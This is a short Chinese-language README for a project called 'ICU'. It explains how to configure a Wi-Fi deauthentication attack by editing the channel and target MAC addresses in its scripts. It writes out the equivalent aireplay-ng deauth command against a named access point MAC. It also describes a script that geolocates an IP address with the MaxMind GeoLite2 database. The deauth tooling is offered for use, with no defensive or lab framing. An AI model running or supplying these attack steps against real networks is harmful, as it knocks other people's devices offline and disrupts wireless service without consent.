# ICU
## Deauth Attack
请在0.sh中自行添加<code>sleep</code><br>
并修改0.c中<code>main</code>函数里的信道<code>b</code><br>
3.py中的<code>addr2</code>和<code>addr3</code><br>
该项目相当于执行<br>
<code>aireplay-ng -0 <int类型> -a 1C:FF:59:33:7F:FF(AP) --ignore-negative-one -D wlan0</code><br>
如果要注释 那么请<code>cat 0.txt</code><br>
## 2.py
用法 <code>python3 2.py <IP Address></code><br>
请到<code>maxmind</code>下载<code>GeoLite2-City.mmdb</code>后运行
